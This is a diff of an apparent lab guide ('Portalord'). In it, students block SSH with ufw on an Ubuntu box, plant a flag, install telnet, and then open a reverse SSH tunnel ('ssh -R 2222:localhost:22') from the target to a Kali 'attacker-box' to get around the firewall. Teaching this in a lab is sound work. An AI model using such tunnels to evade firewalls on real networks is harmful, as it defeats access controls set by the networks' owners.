@@ -17,28 +17,67 @@ title: Portalord
 
 ---
 # 1 using remote ssh
-1. using remote ssh to connect back to a students localhost and get around ufw rules set up in the environment.
+using remote ssh to connect back to a students localhost and get around ufw rules set up in the environment.
 
 
+### On the ssh-closed-box (ubuntu)
 Set up the ufw wirewalls to block all traffic to port 22
 <div class="scroll-box">
-sudo ufw reset
 sudo ufw deny 22
 sudo ufw enable
-</div>   
+</div> 
+
+turn password authentication on for the ubuntu box
+#### `sed...`
+
+create a file that is only accessable to an ssh session by setting a "read only by owner" 
+<div class="scroll-box">
+echo "insert a flag here" > /home/ubuntu/ssh_flag.txt
+chmod 600 /home/ubuntu/ssh_flag.txt
+</div> 
+chmod permissions: Read (r=4), Write (w=2), Execute (x=1)
+first int is the owner
+second int is the group
+third int is others
+so 600 = 4+2 for the owner and 0 for group and 0 for everyone else
 
 Create a user that can only access telnet specific files
-#### `cd /home/inetd.conf`
 #### `sudo adduser teluser`
 
-### On the attacker-box
-Install telnet server if needed:
+set limited permissions for teluser
+#### `sudo nano /usr/local/bin/telnet_shell.sh`
 <div class="scroll-box">
-sudo apt install openbsd-inetd telnetd -y
+#!/bin/bash
+echo "You have limited access."
+echo "You may only use: ls, cat"
+export PATH=/usr/bin
+exec /bin/bash --restricted
+</div> 
+
+install and open telnet services
+<div class="scroll-box">
+sudo apt update && sudo apt install telnetd -y && sudo apt install openbsd-inetd -y
+</div> 
+
+### On the attacker-box
+Install telnet if needed:
+<div class="scroll-box">
+sudo apt update && sudo apt install telnet -y
 </div>   
 
 now telnet into the ssh-closed-box
 #### `telnet x.x.x.x`
+
+now bind a local high port to local 22
+<div class="scroll-box">
+ssh -N -R 2222:localhost:22 kali@your.kali.ip.addr.
+</div>  
+
+if it appears to "hang" you have an open connection
+now from a differnt terminal on you kali localhost
+####'ssh -p2222 ubuntu@ssh.closed.box.ip
+
+go and find your flag
 
 # 2 portbinding
 
